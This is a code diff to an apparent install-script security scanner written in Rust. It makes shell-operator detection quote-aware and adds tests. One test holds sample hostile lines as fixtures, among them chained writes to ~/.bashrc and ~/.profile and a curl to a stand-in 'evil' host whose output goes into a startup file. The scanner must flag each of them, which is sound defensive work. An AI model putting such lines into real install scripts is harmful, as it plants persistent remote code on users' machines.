@@ -434,13 +434,68 @@ fn is_pure_message_print(line: &str) -> bool {
         return false;
     }
     // Anything that could redirect, pipe, substitute, or chain a command means
-    // the line is not a pure print -- scan it.
-    !(t.contains('>')
-        || t.contains('|')
-        || t.contains("$(")
-        || t.contains('`')
-        || t.contains(';')
-        || t.contains('&'))
+    // the line is not a pure print -- scan it. Quote-aware: a `;`/`|`/`&`/`>`
+    // *inside* the quoted message is literal text, not an operator (the real FP
+    // `echo "see ~/.config; then ..."`); command substitution (`$(`/backtick)
+    // still counts inside double quotes, where the shell executes it.
+    !has_executable_operator(t)
+}
+
+/// Whether `t` contains a shell metacharacter that could chain, redirect, or
+/// execute another command -- accounting for quoting:
+///   * `;` `|` `&` `>` are operators only when UNQUOTED (literal inside both
+///     `'...'` and `"..."`).
+///   * `$(` and backtick are command substitution: the shell runs them when
+///     unquoted OR inside double quotes, and treats them literally only inside
+///     single quotes.
+///
+/// A backslash escapes the next byte when unquoted or inside double quotes (it
+/// is literal inside single quotes). Conservative: anything it does not model as
+/// safely-quoted falls through to "is an operator" so we scan rather than trust.
+fn has_executable_operator(t: &str) -> bool {
+    let b = t.as_bytes();
+    let (mut i, mut sq, mut dq) = (0usize, false, false);
+    while i < b.len() {
+        let c = b[i];
+        if sq {
+            // Inside single quotes everything is literal until the closing `'`.
+            if c == b'\'' {
+                sq = false;
+            }
+            i += 1;
+            continue;
+        }
+        if dq {
+            // Inside double quotes only command substitution executes.
+            match c {
+                b'\\' => i += 2,
+                b'"' => {
+                    dq = false;
+                    i += 1;
+                }
+                b'`' => return true,
+                b'$' if b.get(i + 1) == Some(&b'(') => return true,
+                _ => i += 1,
+            }
+            continue;
+        }
+        // Unquoted.
+        match c {
+            b'\\' => i += 2,
+            b'\'' => {
+                sq = true;
+                i += 1;
+            }
+            b'"' => {
+                dq = true;
+                i += 1;
+            }
+            b';' | b'|' | b'&' | b'>' | b'`' => return true,
+            b'$' if b.get(i + 1) == Some(&b'(') => return true,
+            _ => i += 1,
+        }
+    }
+    false
 }
 
 /// If `line` opens a heredoc that just prints a message (no redirection to a
@@ -2113,6 +2168,42 @@ mod tests {
             m.iter().any(|x| x.rule_id == "HIDDEN-001"),
             "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
         );
+    }
+
+    #[test]
+    fn semicolon_inside_quoted_message_is_not_flagged() {
+        // FP: a `;` *inside* the quoted echo string is literal text, not a
+        // command separator. The printed `~/.config` must stay suppressed.
+        let engine = RuleEngine::default();
+        for line in [
+            "echo \"config goes in ~/.config; may need elevated rights\"",
+            "echo 'all settings live under ~/.config; see the wiki'",
+            "msg \"backups: ~/.cache; logs: ~/.local/state\"",
+        ] {
+            let m = engine.match_content(line, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+                "a quoted `;` must not un-suppress HIDDEN-001: {line:?} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unquoted_chain_after_message_is_still_flagged() {
+        // FN-guard: the quote-aware fix must NOT blind us to a real chained
+        // command. An UNQUOTED `;` separates a genuine write to a home dotfile.
+        let engine = RuleEngine::default();
+        for line in [
+            "echo \"installing\"; touch ~/.evilrc",
+            "echo done && echo x >> ~/.bashrc",
+            "printf 'hi'; echo \"$(curl https://evil/x)\" > ~/.profile",
+        ] {
+            let m = engine.match_content(line, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+                "a real chained write to a home dotfile must trip HIDDEN-001: {line:?} -> {m:?}"
+            );
+        }
     }
 
     #[test]
